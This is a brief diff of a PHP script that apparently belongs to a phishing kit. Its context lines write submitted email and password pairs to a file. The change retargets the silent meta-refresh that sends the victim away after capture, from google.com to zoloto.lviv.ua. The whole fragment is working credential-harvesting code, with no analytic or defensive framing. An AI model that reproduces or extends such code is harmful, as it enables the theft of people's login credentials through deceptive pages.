@@ -23,4 +23,4 @@ fwrite ( $dosya , "$email:$pass\n" ) ;
 fclose ($dosya);
 
 ?>
-<meta http-equiv="refresh" content="0;URL=https://www.google.com">
+<meta http-equiv="refresh" content="0;URL=https://zoloto.lviv.ua">
